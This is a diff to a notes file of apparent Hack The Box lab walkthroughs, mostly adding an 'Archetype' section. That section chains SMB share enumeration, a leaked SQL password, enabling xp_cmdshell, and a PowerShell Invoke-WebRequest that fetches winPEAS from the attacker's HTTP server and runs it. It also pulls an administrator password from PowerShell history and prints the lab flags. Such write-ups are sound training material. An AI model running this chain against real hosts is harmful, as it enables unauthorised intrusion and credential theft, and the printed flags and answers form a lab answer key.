@@ -810,7 +810,7 @@ gobuster dir -u http://ignition.htb -w common.txt -x php,html
 
 Look up the password requirements for Magento and also try searching for the most common passwords of 2023. Which password provides access to the admin account? `qwerty123`. Literally search Google for top 10 most common passwords and try each one. Not very interesting. We could also use `hydra` for this.
 
-# Bike `r fa("linux")`
+### Bike `r fa("linux")`
 
  What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high. `22,80`.
 ```{bash eval=F}
@@ -861,3 +861,90 @@ The `whoami` command through the payload returns `root` in BurpSuite.
 Change the command to `cat /root/flag.txt` and we have our flag!
 
 By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user? `root`.
+
+### Archetype `r fa("windows")`
+
+Which TCP port is hosting a database server? `1433`.
+```{bash eval=F}
+nmap -T5 -sC -sV -p- --min-rate=1000 10.129.78.109 > scan.txt
+```
+
+What is the name of the non-Administrative share available over SMB? `backups`.
+```{bash eval=F}
+smbclient -L 10.129.78.109
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+smbclient -N //10.129.78.109/backups
+smb: \> get prod.dtsConfig
+```
+
+What is the password identified in the file on the SMB share? `M3g4c0rp123`.
+
+What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? `mssqlclient.py`.
+
+What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? `xp_cmdshell`.
+
+
+What script can be used in order to search possible paths to escalate privileges on Windows hosts? `winpeas`.
+
+We download `winPEASx64.exe` script from [GitHub](https://github.com/carlospolop/PEASS-ng/releases/) and establish a simple http server with `python` to upload the script to the victim machine. In this case, my `tun0` IP address is `10.10.15.125`.
+```{bash eval=F}
+mkdir http_server
+mv winPEASx64.exe http_server
+cd http_server
+sudo python3 -m http.server 80
+```
+
+
+```{bash eval=F}
+mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.78.109
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell "powershell dir \ "
+SQL> xp_cmdshell "powershell Invoke-WebRequest
+10.10.15.125/winPEASx64.exe -OutFile \Users\Public\winPEASx64.exe"
+SQL> xp_cmdshell "\Users\Public\winPEASx64.exe"
+```
+
+The `winPEASx64.exe` script outputs a lot of files with read permissions. One of them is
+```{bash eval=F}
+\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+What file contains the administrator's password? `ConsoleHost_history.txt`.
+
+```{bash eval=F}
+SQL> xp_cmdshell "powershell Get-Content \Users\sql_svc\Desktop\user.txt"
+3e7b102e78218e935bf3f4951fec21a3
+SQL> xp_cmdshell "powershell Get-Content
+\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+```
+
+Below we need to scape the `!` character as `\!`, otherwise the shell will misinterpret the command.
+```{bash eval=F}
+SQL> smbclient --user=Administrator --password=MEGACORP_4dm1n\!\! //10.129.78.109/C$
+SQL> get Users\Administrator\Desktop\root.txt
+```
+
+Submit user flag: 3e7b102e78218e935bf3f4951fec21a3.
+
+Submit root flag: b91ccec3305e98240082d4474b848528.
+
+
+<!---
+known issue. You gotta find the lib files for your impacket.
+Mine was on /home/user/.local/lib/python3.8/site-packages/impacket/
+
+Edit your tds.py find both lines defining the ctx:
+
+ctx = SSL.Context(SSL.TLSv1_METHOD)
+
+change it to
+
+ctx = SSL.Context(SSL.TLSv1_2_METHOD)
+
+Don’t forget to change both lines where this happens. Save and you’re done.
+-->
